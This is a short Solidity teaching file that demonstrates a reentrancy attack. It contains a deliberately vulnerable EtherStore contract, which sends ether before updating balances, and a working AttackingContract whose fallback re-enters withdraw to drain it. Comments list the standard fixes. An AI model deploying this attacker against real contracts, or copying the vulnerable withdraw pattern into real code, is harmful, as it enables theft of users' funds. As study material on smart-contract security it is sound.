// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.6;

/*
Here we are draining a contract that stores eth for its users
by performing a reentrancy attack.

The reentrancy issue could be fixed by :
- Using the built-in function transfer instead of call. It only
sends 2300 gas which is not enough to reenter the contract.
- Making the changes to state variables before the call in the 
withdraw function.
- Using a mutex. It would lock the contract during code execution 
and thus prevent reentrant calls.

Note that, when performing the attack, this code will throw an 
exception if compiled with versions > 0.8.0 because of underflows.
*/

// users can deposit and withdraw eth in this contract
contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        // ensure the caller has sufficient funds to withdraw
        require(balances[msg.sender] >= _amount);
        (bool success,) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send eth");
        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract AttackingContract {
    EtherStore public etherStore;

    constructor(address _etherStore) public {
        etherStore = EtherStore(_etherStore);
    }

    function attack() external payable {
        // we need to send eth if we want to be able to withdraw
        require(msg.value >= 1 ether, "Send at least 1 eth to attack");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    // this fallback function will be called each time we
    // receive eth from our target contract
    fallback() external payable {
        // since we deposited 1 eth, we can only withdraw 1 eth at a time
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}